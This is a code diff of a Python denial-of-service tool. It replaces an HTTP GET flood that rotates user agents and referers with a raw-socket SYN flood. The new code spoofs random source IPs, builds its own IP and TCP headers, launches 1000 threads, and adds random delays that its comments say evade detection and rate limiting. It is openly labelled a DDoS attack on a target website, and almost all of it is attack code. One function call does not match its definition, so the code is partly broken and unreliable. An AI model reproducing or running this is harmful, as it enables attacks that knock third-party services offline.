@@ -1,74 +1,12 @@
-#!usr/bin/python3.11
 import os
-import time
-import requests
-import threading
-import datetime
 import sys
+import socket
 import random
-import string
-import colorama
+import threading
+import struct
+import time
+import argparse
 
-# Colors
-class bcolors:
-
-    BLACK = '\033[30m'
-    RED = '\033[31m'
-    GREEN = '\033[32m'
-    YELLOW = '\033[33m'
-    BLUE = '\033[34m'
-    MAGENTA = '\033[35m'
-    CYAN = '\033[36m'
-    LIGHT_GRAY = '\033[37m'
-    DARK_GRAY = '\033[90m'
-    LIGHT_RED = '\033[91m'
-    LIGHT_GREEN = '\033[92m'
-    LIGHT_YELLOW = '\033[93m'
-    LIGHT_BLUE = '\033[94m'
-    LIGHT_MAGENTA = '\033[95m'
-    LIGHT_CYAN = '\033[96m'
-    WHITE = '\033[97m'
-    RESET = '\033[0m'
-    BOLD = '\033[1m'
-    DIM = '\033[2m'
-    ITALIC = '\033[3m'
-    UNDERLINE = '\033[4m'
-    BLINK = '\033[5m'
-    REVERSE = '\033[7m'
-    HIDDEN = '\033[8m'
-    STRIKETHROUGH = '\033[9m'
-    DOUBLE_UNDERLINE = '\033[21m'
-    NORMAL_COLOR = '\033[22m'
-    NORMAL_INTENSITY = '\033[22m'
-    RESET_UNDERLINE = '\033[24m'
-    RESET_BLINK = '\033[25m'
-    RESET_REVERSE = '\033[27m'
-    RESET_HIDDEN = '\033[28m'
-    RESET_STRIKETHROUGH = '\033[29m'
-    ORANGE = '\033[38;5;214m'  # Light Orange
-    PURPLE = '\033[38;5;141m'  # Light Purple
-    TEAL = '\033[38;5;37m'     # Teal
-    PINK = '\033[38;5;206m'    # Light Pink
-    LIME = '\033[38;5;154m'    # Lime Green
-    CYAN_BLUE = '\033[38;5;39m'  # Cyan Blue
-    DARK_GREEN = '\033[38;5;22m'  # Dark Green
-    SKY_BLUE = '\033[38;5;111m'  # Sky Blue
-    DARK_ORANGE = '\033[38;5;166m'  # Dark Orange
-    INDIGO = '\033[38;5;57m'   # Indigo
-    GRAY = '\033[38;5;242m'   
-    MAROON = '\033[38;5;52m'   
-    OCEAN_BLUE = '\033[38;5;21m'  
-    GOLD = '\033[38;5;220m' 
-    
-if os.name == 'nt':
-    os.system("cls")
-else:
-    os.system("clear")
-
-os.system("\033[44mhttps://github.com/abatatsa99\033[0m")
-print("\033[7m<<————————————————— MEDAN JUANG BLACK ARMY —————————————————>>\033[0m")
-time.sleep(5)
-print("Loading.......")
 
 attemps = 0
 os.system("clear")   
@@ -100,69 +38,105 @@ while attemps < 100:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
         attemps += 1
         continue
-print("\033[32m┌[Black-Army•••")
-url = input("\033[32m└> URL:  \033[0m").strip()
-u = int(0)
-headers = []
-referer = [
-    "https://google.it",
-    "https://google.com",
-    "https://youtube.com",
-    ]
 
-def useragent():
-    global headers
-    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
-    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
-    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
-    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
-    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
-    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")
+# Random IP Spoofing
+def random_ip():
+    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
 
-    return headers
-		
+# Random port generator to make it harder to block specific port ranges
+def random_port():
+    return random.randint(1024, 65535)
 
-def genstr(size):
-    out_str = ''
+# Generate a random TCP sequence number
+def random_seq():
+    return random.randint(0, 4294967295)
 
-    for _ in range(0, size):
-        code = random.randint(65, 90)
-        out_str += chr(code)
-    
-    return out_str
+# Generate a random TCP window size
+def random_window_size():
+    return random.randint(1024, 65535)
 
+# Create a fake/custom IP header
+def create_ip_header(source_ip, dest_ip):
+    ip_header = struct.pack('!BBHHHBBH4s4s',
+                            69,  # Version and header length (IPv4, 5 * 32 bits = 20 bytes)
+                            0,   # Type of service
+                            40,  # Total length
+                            random.randint(0, 65535),  # Identification
+                            0,   # Flags and Fragment Offset
+                            255, # Time to live
+                            socket.IPPROTO_TCP,  # Protocol
+                            0,   # Header checksum (leave as 0, calculated by kernel)
+                            socket.inet_aton(source_ip),  # Source IP
+                            socket.inet_aton(dest_ip))    # Destination IP
+    return ip_header
 
-class httpth1(threading.Thread):
-    def run(self):
-        global u
-        while True:
-            try:
-                headers={'User-Agent' : random.choice(useragent()), 'Referer' : random.choice(referer)}
-                randomized_url = url + "?" + genstr(random.randint(3, 10))
-                requests.get(randomized_url, headers=headers)
-                u += 1
-                print(f"\033[35m[+] \033[94mExecution_target\033[0m \033[41m" +str(url)+ "\033[32mnum_attack" +u+ "")
-            except requests.exceptions.ConnectionError:
-                print(f"\033[97m[] \033[103mSRIKANDI-313\033[0m  \033[7mConnection-error\033[0m \033[31mServer Maybe down\033[0m")
-
-                pass
-            except requests.exceptions.InvalidSchema:
-                print ("\033[38;5;154  Request time out")
-                raise SystemExit()
-            except ValueError:
-                print ("\033[38;5;242m  Check Your URL]")
-                raise SystemExit()
-            except KeyboardInterrupt:
-                print("[Canceled by User]")
-                raise SystemExit()
+# Create a TCP header with SYN flag set
+def create_tcp_header(source_port, dest_port):
+    tcp_header = struct.pack('!HHLLBBHHH',
+                            source_port,  # Source port
+                            dest_port,    # Destination port
+                            random_seq(),  # Sequence number
+                            0,            # Acknowledgment number
+                            80,           # Data offset and Reserved (TCP Header length)
+                            2,            # Flags (SYN flag set)
+                            random_window_size(),  # Window size
+                            0,            # Checksum (leave as 0, calculated by kernel)
+                            0)            # Urgent pointer
+    return tcp_header
 
 
-while True:
+# SYN Flood Attack with IP Spoofing and randomized packet structure
+def syn_flood(target_ip, target_port):
+    while True:
+        try:
+            # Create raw socket
+            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            # Spoofed source IP
+            source_ip = random_ip()
+            dest_ip = target_ip
+            # Random source port to avoid rate-limiting on a fixed port
+            source_port = random_port()
+            # Create IP and TCP headers
+            ip_header = create_ip_header(source_ip, dest_ip)
+            tcp_header = create_tcp_header(source_ip, dest_ip, source_port, target_port)
+            # Packet = IP header + TCP header
+            packet = ip_header + tcp_header
+            # Send the SYN packet
+            s.sendto(packet, (dest_ip, 0))
+            print(f"Sent SYN packet from {source_ip}:{source_port} to {dest_ip}:{target_port}")
+            # Randomize the delay between packets (anti-rate limiting)
+            time.sleep(random.uniform(0.1, 1.5))  # Add delay between 0.1 to 1.5 seconds to avoid detection
+        except Exception as e:
+            print(f"Error: {e}")
+
+# Function to resolve domain to IP using nslookup
+def resolve_domain(domain):
     try:
-        th1 = httpth1()
-        th1.start()
-    except Exception:
-        pass
-    except KeyboardInterrupt:
-        exit("[Canceled By User]")
-        raise SystemExit()
+        return socket.gethostbyname(domain)
+    except socket.gaierror as e:
+        print(f"Could not resolve domain {domain}: {e}")
+        return None
+
+# Main function to run the attack
+def main():
+    # Set up argument parsing
+    parser = argparse.ArgumentParser(description='Perform SYN Flood DDoS attack with IP Spoofing and Proxies.')
+    parser.add_argument('-u', '--url', type=str, required=True, help='Target website URL')
+    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default is 80 for HTTP)')
+    args = parser.parse_args()
+
+    # Resolve the target domain to IP
+    target_ip = resolve_domain(args.url)
+    if not target_ip:
+        print(f"Error: Could not resolve the target URL: {args.url}")
+        return
+    print(f"Resolved {args.url} to IP: {target_ip}")
+
+    # Launch multiple threads for more attack intensity
+    threads = 1000  # Increase for higher load
+    for _ in range(threads):
+        thread = threading.Thread(target=syn_flood, args=(target_ip, args.port))
+        thread.start()
+
+if __name__ == "__main__":
+    main()
